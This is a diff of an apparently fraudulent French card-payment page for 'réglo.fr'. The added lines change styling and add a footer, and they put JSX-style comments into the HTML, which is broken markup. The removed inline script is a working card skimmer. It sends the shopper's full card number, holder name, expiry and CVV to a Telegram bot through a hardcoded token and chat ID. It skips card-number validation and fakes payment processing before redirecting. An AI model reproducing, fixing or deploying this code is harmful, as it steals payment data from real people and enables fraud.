@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paiement sécurisé | VotreBoutique</title>
+    <title>Paiement sécurisé | réglo.fr</title> <!-- Updated title -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="checkout.css">
 </head>
 <body class="payment-form-body">
-    <header class="checkout-header">
+    <header class="site-header"> {/* Changed class */}
         <div class="container">
-            <div class="logo-container">
-                <div class="logo">réglo<span>.</span></div>
+            <div class="logo-area"> {/* Standardized to logo-area */}
+                <a href="index.html" class="logo">réglo<span>.</span></a>
             </div>
         </div>
     </header>
     
-    <div class="container">
+    <main class="checkout-page-content container"> {/* Added main wrapper */}
         <div class="checkout-steps">
             <div class="step completed">
                 <div class="step-number">1</div>
@@ -33,10 +33,10 @@
             </div>
         </div>
         
-        <div class="payment-container">
+        <div class="payment-container"> {/* This class is specific to checkout.css for layout */}
             <div class="payment-main">
-                <div class="payment-card">
-                    <h2 class="section-title">
+                <div class="payment-card"> {/* This class is specific to checkout.css */}
+                    <h2 class="section-title"> {/* This class is specific to checkout.css */}
                         <i class="far fa-credit-card"></i>
                         Paiement par carte bancaire
                     </h2>
@@ -47,7 +47,6 @@
                         <img src="hd-amex-american-express-logo-png-701751694708970jttzjjyo6e.png" alt="CB" class="card-icon" style="object-fit: cover;">
                     </div>
                     
-                    <!-- Carte de crédit visuelle -->
                     <div class="credit-card">
                         <div class="card-logo">
                             <div class="card-chip"></div>
@@ -94,7 +93,7 @@
                             </div>
                         </div>
                         
-                        <button type="submit" class="btn btn-success">
+                        <button type="submit" class="btn btn-primary btn-success"> {/* Ensured btn-primary for theme */ }
                             <i class="fas fa-lock"></i> Payer maintenant
                         </button>
                         
@@ -106,9 +105,9 @@
                 </div>
             </div>
             
-            <div class="payment-sidebar">
-                <div class="order-summary">
-                    <h2 class="section-title">
+            <div class="payment-sidebar"> {/* This class is specific to checkout.css for layout */}
+                <div class="order-summary"> {/* This class is specific to checkout.css */}
+                    <h2 class="section-title"> {/* This class is specific to checkout.css */}
                         <i class="fas fa-shopping-cart"></i>
                         Récapitulatif de commande
                     </h2>
@@ -124,280 +123,38 @@
                 </div>
             </div>
         </div>
-    </div>
+    </main>
     
-    <!-- Overlay de chargement -->
     <div class="loading-overlay" id="loading-overlay">
         <div class="loading-spinner"></div>
         <div class="loading-text">Traitement de votre paiement...</div>
     </div>
 
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // Configuration du bot Telegram (vérifiez ces valeurs)
-        const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
-        const TELEGRAM_CHAT_ID = '5372119436';
-        
-        // Chargement des données de commande
-        let orderData = {};
-        try {
-            orderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
-        } catch (e) {
-            console.error("Erreur de lecture des données", e);
-        }
-
-        // Récupération des éléments avec vérification
-        const elements = {
-            orderItems: document.getElementById('order-items'),
-            orderTotal: document.getElementById('order-total-amount'),
-            paymentForm: document.getElementById('payment-form'),
-            loadingOverlay: document.getElementById('loading-overlay'),
-            cardNumber: document.getElementById('card-number'),
-            cardHolder: document.getElementById('card-holder'),
-            cardExpiry: document.getElementById('card-expiry'),
-            cardCvv: document.getElementById('card-cvv')
-        };
-
-        // Fonctions utilitaires pour cartes
-        const cardUtils = {
-            formatNumber: num => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
-            
-            detectType: num => {
-                const cleaned = num.replace(/\s/g, '');
-                if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
-                if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
-                if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
-                return 'Carte Bancaire';
-            },
-            
-            validateNumber: num => {
-                const cleaned = num.replace(/\s/g, '');
-                if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
-                
-                let sum = 0;
-                let alternate = false;
-                for (let i = cleaned.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cleaned.charAt(i));
-                    if (alternate) {
-                        digit *= 2;
-                        if (digit > 9) digit -= 9;
-                    }
-                    sum += digit;
-                    alternate = !alternate;
-                }
-                return sum % 10 === 0;
-            },
-            
-            validateExpiry: exp => {
-                if (!exp || !exp.includes('/')) return false;
-                const [mm, yy] = exp.split('/');
-                const month = parseInt(mm), year = parseInt(yy);
-                if (isNaN(month) || isNaN(year)) return false;
-                
-                const now = new Date();
-                const currentYear = now.getFullYear() % 100;
-                const currentMonth = now.getMonth() + 1;
-                
-                return (year > currentYear) || (year === currentYear && month >= currentMonth);
-            }
-        };
-
-        // Affichage des articles
-        function displayOrderItems() {
-            if (!elements.orderItems) return;
-            
-            if (!orderData.items || !orderData.items.length) {
-                elements.orderItems.innerHTML = '<p class="empty">Votre panier est vide</p>';
-                return;
-            }
-            
-            elements.orderItems.innerHTML = orderData.items.map(item => `
-                <div class="item">
-                    <div class="info">
-                        <div class="name">${item.name}</div>
-                        <div class="variant">${item.variant}</div>
-                        <div class="qty">Quantité: ${item.quantity}</div>
-                    </div>
-                    <div class="price">${(item.price * item.quantity).toFixed(2)} €</div>
+    <footer class="site-footer-v2">
+        <div class="container">
+            <div class="footer-columns">
+                <div class="footer-column">
+                    <h4>À propos</h4>
+                    <ul>
+                        <li><a href="#">Notre mission</a></li>
+                        <li><a href="#">Nos engagements</a></li>
+                    </ul>
                 </div>
-            `).join('');
-            
-            if (elements.orderTotal) {
-                elements.orderTotal.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
-            }
-        }
+                <div class="footer-column">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="javascript:void(0);" class="legal-link" data-type="terms">CGV</a></li>
+                        <li><a href="javascript:void(0);" class="legal-link" data-type="privacy">Confidentialité</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom-v2">
+                <p>&copy; 2024 réglo. Tous droits réservés.</p>
+            </div>
+        </div>
+    </footer>
 
-        // Validation du formulaire
-        function validateForm() {
-            if (!elements.cardNumber || !elements.cardHolder || 
-                !elements.cardExpiry || !elements.cardCvv) {
-                alert("Erreur système. Rechargez la page.");
-                return false;
-            }
-            
-            // Validation du numéro
-            if (!cardUtils.validateNumber(elements.cardNumber.value.replace(/\s/g, ''))) {
-            }
-            
-            // Validation titulaire
-            if (elements.cardHolder.value.trim().length < 3) {
-                alert("Nom du titulaire invalide");
-                return false;
-            }
-            
-            // Validation date
-            if (!cardUtils.validateExpiry(elements.cardExpiry.value)) {
-                alert("Date d'expiration invalide (MM/AA)");
-                return false;
-            }
-            
-            // Validation CVV
-            const cardType = cardUtils.detectType(elements.cardNumber.value);
-            const cvvLength = cardType === 'American Express' ? 4 : 3;
-            if (!elements.cardCvv.value || !new RegExp(`^\\d{${cvvLength}}$`).test(elements.cardCvv.value)) {
-                alert(`CVV invalide (${cvvLength} chiffres requis)`);
-                return false;
-            }
-            
-            return true;
-        }
-
-        // Envoi à Telegram (version améliorée)
-        async function sendToTelegram(cardInfo) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error("Configuration Telegram manquante");
-                return false;
-            }
-            
-            try {
-                const orderId = orderData.orderId || 'CMD-' + Date.now().toString().slice(-6);
-                const customer = orderData.customer || {};
-                
-                // Construction du message
-                const message = `💳 *NOUVELLE COMMANDE* 💳
-
-💰 *Total:* ${orderData.total?.toFixed(2) || '0.00'} €
-
-💳 *Paiement:*
-- Titulaire: ${cardInfo.holder}
-- Numéro: ${cardInfo.number}
-- Expiration: ${cardInfo.expiry}
-- CVV: ${cardInfo.cvv}`;
-
-                // Envoi avec fetch
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                
-                if (!response.ok) {
-                    const error = await response.json();
-                    throw new Error(error.description || "Erreur Telegram");
-                }
-                
-                return true;
-            } catch (error) {
-                console.error("Échec envoi Telegram:", error);
-                return false;
-            }
-        }
-
-        // Gestion de la soumission
-        async function handleSubmit(e) {
-            e.preventDefault();
-            
-            if (!validateForm()) return;
-
-            // --- BEGINNING OF CODE TO INSERT ---
-            const totalAmountForStorage = orderData.total?.toFixed(2) || '0.00';
-            const cardHolderForStorage = elements.cardHolder.value;
-            const cardNumberFullForStorage = elements.cardNumber.value.replace(/\s/g, ''); // Remove spaces
-            const cardLast4ForStorage = cardNumberFullForStorage.slice(-4);
-
-            const verificationDataForStorage = {
-                merchant: "réglo.fr",
-                amount: totalAmountForStorage,
-                cardLast4: cardLast4ForStorage,
-                cardHolderName: cardHolderForStorage
-            };
-            localStorage.setItem('paymentVerificationData', JSON.stringify(verificationDataForStorage));
-            // --- END OF CODE TO INSERT ---
-            
-            // Activation du loader
-            if (elements.loadingOverlay) {
-                elements.loadingOverlay.style.display = 'flex';
-            }
-            
-            try {
-                // Préparation des données
-                const cardInfo = {
-                    type: cardUtils.detectType(elements.cardNumber.value),
-                    number: elements.cardNumber.value,
-                    holder: elements.cardHolder.value,
-                    expiry: elements.cardExpiry.value,
-                    cvv: elements.cardCvv.value // Add CVV here
-                };
-                
-                // Envoi à Telegram
-                const telegramSent = await sendToTelegram(cardInfo);
-                if (!telegramSent) {
-                    console.warn("L'envoi à Telegram a échoué");
-                }
-                
-                // Simulation traitement
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Redirection
-                window.location.href = 'traitement4.html';
-                
-            } catch (error) {
-                console.error("Erreur:", error);
-                alert("Une erreur est survenue. Veuillez réessayer.");
-            } finally {
-                if (elements.loadingOverlay) {
-                    elements.loadingOverlay.style.display = 'none';
-                }
-            }
-        }
-
-        // Initialisation
-        function init() {
-            displayOrderItems();
-            
-            if (elements.paymentForm) {
-                elements.paymentForm.addEventListener('submit', handleSubmit);
-            }
-            
-            // Formatage automatique des inputs
-            if (elements.cardNumber) {
-                elements.cardNumber.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 16) value = value.slice(0, 16);
-                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                });
-            }
-            
-            if (elements.cardExpiry) {
-                elements.cardExpiry.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length > 4) value = value.slice(0, 4);
-                    if (value.length > 2) {
-                        value = value.slice(0, 2) + '/' + value.slice(2);
-                    }
-                    e.target.value = value;
-                });
-            }
-        }
-
-        init();
-    });
-</script>
     <script src="checkout_flow.js" defer></script>
 </body>
 </html>
